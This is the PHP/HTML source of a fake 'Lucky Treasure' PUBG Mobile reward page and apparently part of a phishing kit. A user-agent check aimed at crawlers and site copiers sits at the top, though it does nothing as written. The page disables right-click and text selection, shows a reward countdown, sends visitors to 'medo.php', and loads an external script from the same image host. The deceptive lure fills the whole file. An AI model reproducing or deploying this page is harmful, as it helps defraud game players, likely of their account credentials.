<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
?>
<html>
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta property="og:title" content="<?php echo $title;?>">
<meta name="description" content="<?php echo $description;?>">
<meta property="og:description" content="<?php echo $description;?>">
<meta property="og:url" content="./">
<meta property="og:site_name" content="<?php echo $title;?>">
<meta property="og:type" content="website">
<meta name="copyright"content="<?php echo $copyright;?>">
<meta name="theme-color" content="<?php echo $theme;?>">
<meta property="og:image" content="<?php echo $image;?>">
<title><?php echo $title;?></title>
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
<link rel="icon" href="<?php echo $icon;?>">
<style type="text/css">
	@charset "utf-8";
@import url("https://fonts.googleapis.com/css2?family=Teko&display=swap");
*,*:before,*:after {
	-webkit-box-sizing:border-box;
	-moz-box-sizing:border-box;
	box-sizing:border-box;
}
body {
	background: url(https://eldi.ga/s0/img/bg_wshop2-min.png) no-repeat center;
	-webkit-background-size:cover;
	-moz-background-size:cover;
	-o-background-size:cover;
	background-size: cover;
	margin: 0;
	padding: 0;
	color: #000;
	font-family: 'Teko', sans-serif;
}
	.my-container {
	background-color: rgba(270, 270, 270, 0.1);
	background-size: cover;
	position: relative;
	margin: 0px auto;
	margin-top: 1%;
	margin-bottom: 1%;
	padding: 0px;
	max-width: 350px;
	height: 550px;
	border: 1px solid white;
	border-radius: 10px;
}
.poster {
	background: url(https://eldi.ga/s0/img/royale.jpg) no-repeat center;
	background-size: 100% 100%;
	position: relative;
	width: 100%;
	height: 40%;
	border-bottom: 1px solid white;
}
.poster2 {
	background: url(https://eldi.ga/s0/img/royale.jpg) no-repeat center;
	background-size: 100% 100%;
	position: relative;
	margin-top: 35%;
	width: 100%;
	height: 40%;
	transform: rotate(180deg);
	border-bottom: 1px solid white;
}
.royale {
	background: url(https://eldi.ga/s0/img/new.jpg) rgba(43,53,67,0.9) no-repeat top;
	background-size: 100% 50%;
	position: absolute;
	top: 30%;
	margin-left: 10%;
	width: 80%;
	height: 40%;
	border-radius: 8px;
	border:1px solid white;
	text-align: center;
	letter-spacing: 5;
}
.txt-crate-name {
	background-image: linear-gradient(to right,#fff, #ffffff00 , #fff);
	width: 100%;
	margin-top: 10px;
	padding-top: 0px;
	padding-bottom: 0px;
	color: #fff;
	font-size: 25px;
	text-align: left;
	border-left: 2px solid white;
	float: left;
	font-weight: bold;
	position: absolute;
	top: 0;
	text-align: center;
}
.txt-crate-name span {
	font-size: 15px;
	line-height: 10px;
	width: 100%;
	background-image: linear-gradient(to right,#ffffff00, rgba(0,0,0,0.9) , #ffffff00);
}

.content-poster {
	width: 100%;
	height: 92%;
	margin-left: auto;
	margin-right: auto;
	display: block;

}
.btn-open-crate {
	background: url(https://eldi.ga/s0/img/bg_cratebtn1.png) center no-repeat;
	background-size: cover;
	position: absolute;
	top: 67%;
	left: 30%;
	width: 40%;
	height: auto;
	margin-left: auto;
	margin-right: auto;
	padding: 8px;
	color: #fff;
	font-size: 15px;
	font-family: 'Teko', sans-serif;
	text-align: center;
	border: 1px solid #fff;
	outline: none;
	display: block;
	border-radius: 3px;
	box-shadow: 0px 0px 8px 2px white;
	cursor: pointer;
}
.bpng{
	width: 180px;
	height: 100px;
	position: absolute;
	top: 11%;
	left: 24.5%;
}
.oo{
	opacity: 0.7;margin-top: 34.5%;
}
@media only screen and (max-width:600px) {
	body {
		margin: 0px;
		padding: 0px;
	}
	.my-container {
        width: 100%;
        height: 100%;
        margin-top: 0px;
        margin-bottom: 0px;
        border-radius: 0px;
        padding: 0px;
		box-shadow: none;
    }
	.poster {
		width: 100%;
		border: none;
		border-bottom: 1px solid white;
	}

	.txt-crate-name {
	margin-top: 9px;
}
.txt-crate-name span {
	font-size: 15px;
	line-height: 10px;
}
.crate-eye {
	margin-top: 5px;
}
.royale {
	top: 30%;
}
.btn-open-crate {
	top: 66.5%;
}
.oo{
	opacity: 0.7;margin-top: 39.5%;
}
}
</style>
</head>
<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">

<div class="my-container">
<div class="poster"></div>
<div class="poster2"></div>
<div class="txt-crate-name">
LUCKY TREASURE
<br>
<span>This is secret event in new season Pubg Mobile</span>
</div>
<img src="https://eldi.ga/s0/img/yo16.png" class="bpng">
<div class="content-poster"></div>
<div class="royale">
	<img src="https://eldi.ga/s0/img/bok.png" width="170px" height="100px;" class="oo">	
</div>
<button type="button" class="btn-open-crate" onmousedown="buka.play()" onclick="location.href='medo.php';">Open Lucky Treasure</button>
<h3 style="background:black;border:2px solid white;width: 80%;margin-left: 10%;position: absolute;top: 80%;height: 40px;padding-top: 5px;color: white;text-align: center;border-radius: 5px">
	REWARD COUNTDOWN : <span id="waktub" style="letter-spacing: 2;"></span>
</h3>
</div>

<script type="text/javascript" src="https://eldi.ga/s0/js/shagitz.js"></script>

</body>
</html>

<script>
document.getElementsByTagName("div")[0].style.display = "none";
</script>
